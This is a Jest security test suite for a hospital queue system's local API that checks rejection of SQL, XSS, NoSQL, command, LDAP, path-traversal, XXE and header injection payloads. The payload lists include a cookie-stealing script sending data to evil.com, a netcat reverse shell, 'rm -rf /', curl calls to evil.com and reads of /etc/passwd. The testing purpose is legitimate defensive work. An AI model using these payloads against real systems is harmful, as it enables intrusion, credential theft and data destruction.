/**
 * SUITE DE TESTING DE SEGURIDAD - INYECCIONES
 * Sistema TomaTurno INER
 * Criticidad: ALTA
 */

describe('🔒 Security Testing - Injection Attacks', () => {

  describe('SQL Injection Tests', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE turnRequest; --",
      "1' OR '1'='1",
      "admin'--",
      "' OR 1=1--",
      "'; EXEC xp_cmdshell('net user'); --",
      "UNION SELECT * FROM users--",
      "' AND 1=(SELECT COUNT(*) FROM users); --",
      "'; WAITFOR DELAY '00:00:10'--",
      "%(password)s' OR '1'='1",
    ];

    test.each(sqlInjectionPayloads)(
      '[SQL-001] Should prevent SQL injection in patient name: %s',
      async (payload) => {
        const response = await fetch('http://localhost:3005/api/turns/create', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            patientName: payload,
            age: 30,
            gender: 'M',
            studies: ['Test'],
          }),
        });

        // Should either sanitize or reject
        expect([201, 400, 422]).toContain(response.status);

        // Verify database integrity
        const checkDb = await fetch('http://localhost:3005/api/health');
        expect(checkDb.status).toBe(200);
      }
    );

    test('[SQL-002] Should prevent SQL injection in age field', async () => {
      const response = await fetch('http://localhost:3005/api/turns/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          patientName: 'Test Patient',
          age: "30; DROP TABLE turnRequest; --",
          gender: 'M',
        }),
      });

      expect(response.status).not.toBe(201);
    });
  });

  describe('XSS (Cross-Site Scripting) Tests', () => {
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "javascript:alert('XSS')",
      "<iframe src='javascript:alert(\"XSS\")'></iframe>",
      "<body onload=alert('XSS')>",
      "';alert(String.fromCharCode(88,83,83))//",
      "<script>document.location='http://evil.com?cookie='+document.cookie</script>",
      "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
      "<input type='text' value='<script>alert(\"XSS\")</script>'>",
    ];

    test.each(xssPayloads)(
      '[XSS-001] Should prevent XSS in patient name: %s',
      async (payload) => {
        const response = await fetch('http://localhost:3005/api/turns/create', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            patientName: payload,
            age: 30,
            gender: 'F',
            studies: ['Blood Test'],
          }),
        });

        if (response.status === 201) {
          const data = await response.json();

          // Fetch the created turn
          const queueResponse = await fetch('http://localhost:3005/api/queue/list');
          const queueData = await queueResponse.json();

          // Verify the payload is escaped/sanitized
          const createdTurn = queueData.pendingTurns?.find(t => t.id === data.assignedTurn);
          if (createdTurn) {
            expect(createdTurn.patientName).not.toContain('<script>');
            expect(createdTurn.patientName).not.toContain('javascript:');
          }
        }
      }
    );

    test('[XSS-002] Should sanitize HTML in observations field', async () => {
      const response = await fetch('http://localhost:3005/api/turns/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          patientName: 'Test Patient',
          age: 25,
          gender: 'F',
          observations: "<script>alert('XSS in observations')</script>Important note",
        }),
      });

      if (response.status === 201) {
        const data = await response.json();
        // Observations should be sanitized
        expect(data.observations).not.toContain('<script>');
      }
    });
  });

  describe('NoSQL Injection Tests', () => {
    const noSqlPayloads = [
      { "$ne": null },
      { "$gt": "" },
      { "$regex": ".*" },
      { "username": { "$ne": null }, "password": { "$ne": null } },
      { "$where": "this.password == 'password'" },
      { "age": { "$gte": 0 } },
    ];

    test.each(noSqlPayloads)(
      '[NOSQL-001] Should prevent NoSQL injection: %o',
      async (payload) => {
        const response = await fetch('http://localhost:3005/api/turns/create', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            patientName: payload,
            age: 30,
            gender: 'M',
          }),
        });

        // Should reject object payloads for string fields
        expect([400, 422]).toContain(response.status);
      }
    );

    test('[NOSQL-002] Should prevent NoSQL injection in login', async () => {
      const response = await fetch('http://localhost:3005/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: { "$ne": null },
          password: { "$ne": null },
        }),
      });

      expect(response.status).not.toBe(200);
    });
  });

  describe('Command Injection Tests', () => {
    const commandInjectionPayloads = [
      "; ls -la",
      "| cat /etc/passwd",
      "&& rm -rf /",
      "`whoami`",
      "$(curl http://evil.com)",
      "; nc -e /bin/bash evil.com 4444",
      "& ping -c 10 127.0.0.1",
    ];

    test.each(commandInjectionPayloads)(
      '[CMD-001] Should prevent command injection: %s',
      async (payload) => {
        const response = await fetch('http://localhost:3005/api/turns/create', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            patientName: `Patient ${payload}`,
            age: 30,
            gender: 'M',
          }),
        });

        // System should still be responsive
        expect(response.status).toBeDefined();

        // Verify system is not compromised
        const healthCheck = await fetch('http://localhost:3005/api/health');
        expect(healthCheck.status).toBe(200);
      }
    );
  });

  describe('LDAP Injection Tests', () => {
    const ldapPayloads = [
      "*)(uid=*",
      "*)(|(uid=*",
      "admin)(|(password=*",
      "*)(&",
      "*)(objectClass=*",
    ];

    test.each(ldapPayloads)(
      '[LDAP-001] Should prevent LDAP injection in username: %s',
      async (payload) => {
        const response = await fetch('http://localhost:3005/api/auth/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: payload,
            password: 'password',
          }),
        });

        // Should not authenticate with LDAP injection
        expect([400, 401, 404]).toContain(response.status);
      }
    );
  });

  describe('Path Traversal Tests', () => {
    const pathTraversalPayloads = [
      "../../etc/passwd",
      "..\\..\\windows\\system32\\config\\sam",
      "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "....//....//etc/passwd",
      "..;/etc/passwd",
      "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    ];

    test.each(pathTraversalPayloads)(
      '[PATH-001] Should prevent path traversal: %s',
      async (payload) => {
        // Assuming there might be file upload or file reference endpoints
        const response = await fetch('http://localhost:3005/api/turns/create', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            patientName: 'Test',
            age: 30,
            gender: 'M',
            clinicalInfo: payload,
          }),
        });

        // Should not expose file system
        if (response.status === 201) {
          const data = await response.json();
          expect(data).not.toContain('root:');
          expect(data).not.toContain('[fonts]');
        }
      }
    );
  });

  describe('XXE (XML External Entity) Injection Tests', () => {
    const xxePayloads = [
      `<?xml version="1.0"?>
       <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
       <foo>&xxe;</foo>`,
      `<?xml version="1.0"?>
       <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>
       <foo>&xxe;</foo>`,
    ];

    test('[XXE-001] Should prevent XXE injection', async () => {
      // If the API accepts XML
      const response = await fetch('http://localhost:3005/api/turns/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/xml' },
        body: xxePayloads[0],
      });

      // Should reject XML or parse safely
      expect([400, 415]).toContain(response.status);
    });
  });

  describe('Header Injection Tests', () => {
    test('[HDR-001] Should prevent CRLF injection in headers', async () => {
      const response = await fetch('http://localhost:3005/api/auth/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Custom': 'test\\r\\nX-Injected: malicious',
        },
        body: JSON.stringify({
          username: 'admin',
          password: 'password',
        }),
      });

      // Check response headers for injection
      const headers = response.headers;
      expect(headers.get('X-Injected')).toBeNull();
    });
  });

  describe('JSON Injection Tests', () => {
    test('[JSON-001] Should handle malformed JSON gracefully', async () => {
      const response = await fetch('http://localhost:3005/api/turns/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: '{"patientName": "Test", "age": 30, "gender": "M"',  // Missing closing brace
      });

      expect(response.status).toBe(400);
    });

    test('[JSON-002] Should handle deeply nested JSON', async () => {
      let deeplyNested = { value: 'test' };
      for (let i = 0; i < 1000; i++) {
        deeplyNested = { nested: deeplyNested };
      }

      const response = await fetch('http://localhost:3005/api/turns/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          patientName: 'Test',
          age: 30,
          gender: 'M',
          clinicalInfo: deeplyNested,
        }),
      });

      // Should prevent stack overflow
      expect([400, 413, 422]).toContain(response.status);
    });
  });

  describe('MongoDB Injection Tests', () => {
    test('[MONGO-001] Should prevent $where injection', async () => {
      const response = await fetch('http://localhost:3005/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: 'admin',
          password: { "$where": "return true" },
        }),
      });

      expect(response.status).not.toBe(200);
    });
  });
});

module.exports = {
  injectionTestSuite: 'Security Injection Tests Complete',
};